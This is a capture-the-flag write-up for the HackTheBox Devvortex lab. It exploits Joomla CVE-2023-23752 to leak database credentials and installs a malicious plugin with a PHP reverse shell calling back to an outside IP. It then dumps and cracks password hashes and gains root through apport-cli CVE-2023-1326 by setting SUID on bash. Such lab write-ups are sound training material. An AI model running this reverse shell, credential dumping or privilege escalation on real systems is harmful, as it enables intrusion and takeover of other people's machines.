# HackTheBox Devvortex

Easy level CTF lab machine of the HackTheBox platform running on Linux OS, where we will first exploit a vulnerability in Joomla related to sensitive data disclosure (CVE-2023-23752) and then exploit privilege escalation via apport-cli (CVE-2023-1326).

## Service Overview

To scan machine 10.10.11.242 we will use rustscan:

```shell
$ wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
$ unzip rustscan_2.1.0_both.zip
$ dpkg -i rustscan_2.1.0_amd64.deb
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.242 -- -A -sC

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=11/26%OT=22%CT=%CU=42730%PV=Y%DS=2%DC=T%G=N%TM=6563304C%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)
```

## Web service

Going to the web service on port 80 redirects to the devvortex.htb domain, so let's add this host to /etc/hosts.

```shell
$ nano /etc/hosts

10.10.11.242 devvortex.htb
```

Let's search for subdomains using gobuster or wfuzz.

```shell
$ gobuster vhost -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devvortex.htb
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
Found: dev.devvortex.htb (Status: 200) [Size: 23221]

===============================================================

$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://devvortex.htb/" -H "Host: FUZZ.devvortex.htb" --hl 7
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:200   501 L    1581 W     23221 Ch    "dev"

Total time: 54.58171
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 91.40423
```

Add the found subdomain to /etc/hosts in the same way.

```shell
$ nano /etc/hosts

10.10.11.242 devvortex.htb dev.devvortex.htb
```

Let's search for interesting directories using wfuzz.

```shell
$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --sc 202,204,301,302,307,403 http://dev.devvortex.htb/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.devvortex.htb/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000016:301   7 L      12 W       178 Ch      "images"
000000081:301   7 L      12 W       178 Ch      "templates"
000000080:301   7 L      12 W       178 Ch      "media"
000000145:301   7 L      12 W       178 Ch      "modules"
000000520:301   7 L      12 W       178 Ch      "plugins"
000000637:301   7 L      12 W       178 Ch      "includes"
000000872:301   7 L      12 W       178 Ch      "language"
000001005:301   7 L      12 W       178 Ch      "components"
000001022:301   7 L      12 W       178 Ch      "api"
000001088:301   7 L      12 W       178 Ch      "cache"
000001254:301   7 L      12 W       178 Ch      "libraries"
000003276:301   7 L      12 W       178 Ch      "tmp"
000003556:301   7 L      12 W       178 Ch      "layouts"
000005562:301   7 L      12 W       178 Ch      "administrator"
```

We recognize that it is Joomla, and we can scan it:
 
```shell
$ joomscan --url http://dev.devvortex.htb

Processing http://dev.devvortex.htb ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/

[+] Finding common backup files name


[++] Backup files are not found

[+] Finding common log files name

[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found
```

The version using - 4.2.6. Right away we find the [CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752) vulnerability - joomla 4.2.6 exploit github.

```shell
$ git clone https://github.com/Acceis/exploit-CVE-2023-23752.git && cd exploit-CVE-2023-23752

$ gem install httpx docopt paint

$ ruby exploit.rb -h
Joomla! < 4.2.8 - Unauthenticated information disclosure

Usage:
  exploit.rb <url> [options]
  exploit.rb -h | --help

Parameters:
  <url>       Root URL (base path) including HTTP scheme, port and root folder

Options:
  --debug     Display arguments
  --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
  -h, --help  Show this screen

Examples:
  exploit.rb http://127.0.0.1:4242
  exploit.rb https://example.org/subdir

Project:
  author (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
  company (https://www.acceis.fr / https://twitter.com/acceis)
  source (https://github.com/Acceis/exploit-CVE-2023-23752)


$ ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

From here we find the login and password, which is perfect for the admin area: ```lewis:P4ntherg0t1n5r3c0n##```.

After to logging in, we need to setup our reverse shell plugin. We need three files. First, we need an xml file ```shell.xml``` to describe the plugin:

```xml
<?xml version="1.0" encoding="utf-8"?>
<extension version="4.0" type="plugin" group="content">
 <name>plg_content_shell</name>
 <author>1</author>
 <creationDate>December 28, 2021</creationDate>
 <copyright>Free</copyright>
 <authorEmail>1@1.com</authorEmail>
 <authorUrl>http://1.com</authorUrl>
 <version>1.0</version>
 <description>shell</description>
 <files>
  <filename plugin="shell">shell.php</filename>
  <filename>index.html</filename>
 </files>
</extension>
```

Next, we need our PHP ```shell.php``` which contains the line for the reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'");
defined('_JEXEC') or die;
class plgContentRevShell extends JPlugin
{
  public function onContentAfterTitle($context, &$article, &$params, $limitstart)
    {
      return "<p>Boom!</p>";
    }
}
?>
```

Finally, we need an empty index.html file. We zip up all three files. 

```shell
$ touch index.html
$ zip revshell.zip shell.xml shell.php index.html
  adding: shell.xml (deflated 46%)
  adding: shell.php (deflated 19%)
  adding: index.html (stored 0%)
```

We upload the file to Joomla: ```http://dev.devvortex.htb/administrator/index.php?option=com_installer&view=install```. We have our plugin installed -- all that remains is to enable it. We enable the plugin ```plg_content_shell``` and we catch our shell.

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 36564
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:~/dev.devvortex.htb/administrator$ netstat -tunlp
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      860/nginx: worker p
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      860/nginx: worker p
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

In the network connections we see two databases - 3306 and 33060. In 3306 we find a valid hash of the logan user.

```shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -P 3306 -e "SHOW DATABASES;"
<'P4ntherg0t1n5r3c0n##' -P 3306 -e "SHOW DATABASES;"

mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
joomla
performance_schema

www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -P 3306 -e "SHOW TABLES;" joomla
<therg0t1n5r3c0n##' -P 3306 -e "SHOW TABLES;" joomla
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_joomla
sd4fg_action_log_config
sd4fg_action_logs
sd4fg_action_logs_extensions
sd4fg_action_logs_users
sd4fg_assets
sd4fg_associations
sd4fg_banner_clients
sd4fg_banner_tracks
sd4fg_banners
sd4fg_categories
sd4fg_contact_details
sd4fg_content
sd4fg_content_frontpage
sd4fg_content_rating
sd4fg_content_types
sd4fg_contentitem_tag_map
sd4fg_extensions
sd4fg_fields
sd4fg_fields_categories
sd4fg_fields_groups
sd4fg_fields_values
sd4fg_finder_filters
sd4fg_finder_links
sd4fg_finder_links_terms
sd4fg_finder_logging
sd4fg_finder_taxonomy
sd4fg_finder_taxonomy_map
sd4fg_finder_terms
sd4fg_finder_terms_common
sd4fg_finder_tokens
sd4fg_finder_tokens_aggregate
sd4fg_finder_types
sd4fg_history
sd4fg_languages
sd4fg_mail_templates
sd4fg_menu
sd4fg_menu_types
sd4fg_messages
sd4fg_messages_cfg
sd4fg_modules
sd4fg_modules_menu
sd4fg_newsfeeds
sd4fg_overrider
sd4fg_postinstall_messages
sd4fg_privacy_consents
sd4fg_privacy_requests
sd4fg_redirect_links
sd4fg_scheduler_tasks
sd4fg_schemas
sd4fg_session
sd4fg_tags
sd4fg_template_overrides
sd4fg_template_styles
sd4fg_ucm_base
sd4fg_ucm_content
sd4fg_update_sites
sd4fg_update_sites_extensions
sd4fg_updates
sd4fg_user_keys
sd4fg_user_mfa
sd4fg_user_notes
sd4fg_user_profiles
sd4fg_user_usergroup_map
sd4fg_usergroups
sd4fg_users
sd4fg_viewlevels
sd4fg_webauthn_credentials
sd4fg_workflow_associations
sd4fg_workflow_stages
sd4fg_workflow_transitions
sd4fg_workflows

www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' -P 3306 -e "SELECT * FROM sd4fg_users;" joomla
<n##' -P 3306 -e "SELECT * FROM sd4fg_users;" joomla
mysql: [Warning] Using a password on the command line interface can be insecure.
id      name    username        email   password        block   sendEmail       registerDate    lastvisitDate   activation      params  lastResetTime   resetCount      otpKey otep     requireReset    authProvider
649     lewis   lewis   lewis@devvortex.htb     $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u    0       1       2023-09-25 16:44:24     2023-11-26 12:35:06    NULL     0                       0
650     logan paul      logan   logan@devvortex.htb     $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12    0       0       2023-09-26 19:15:42     NULL           {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}  NULL    0              0
```

Then we just brute force it, get the password for SSH and connect ``` 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System```:

```shell
$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

$ ssh logan@10.10.11.242
logan@10.10.11.242's password: tequieromucho

logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:~$ ls
exploit.c  user.txt
logan@devvortex:~$ cat user.txt
8c27b808c83dc5550cf781fbc7ee6370
logan@devvortex:~$
```

## Privilege escalation

Let's check our superuser rights:

```shell
logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
```

We immediately find [CVE-2023-1326](https://ubuntu.com/security/CVE-2023-1326) and Proof of concept: https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb. We need to create a crash report, let's take any package (in my case curl).

```shell
logan@devvortex:~$ sudo apport-cli -f --package=curl --save=/var/crash/curl.crash

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.......................

logan@devvortex:~$ cd /var/crash/
logan@devvortex:/var/crash$ ls
_usr_bin_sleep.1000.crash  curl.crash
```

After creating the report, we read it with a vulnerable utility, copy it to bash and give it SUID rights:

```shell
logan@devvortex:/var/crash$ sudo apport-cli -c /var/crash/curl.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (4.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
> !id
uid=0(root) gid=0(root) groups=0(root)
> !chmod u+s /bin/bash
> !done (press RETURN)

logan@devvortex:/var/crash$ ls /bin/bash
/bin/bash
logan@devvortex:/var/crash$ bash -p
bash-5.0# id
uid=1000(logan) gid=1000(logan) euid=0(root) groups=1000(logan)
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt
0d714098eaf0081b2ea2a8bc041bca2d
bash-5.0#
```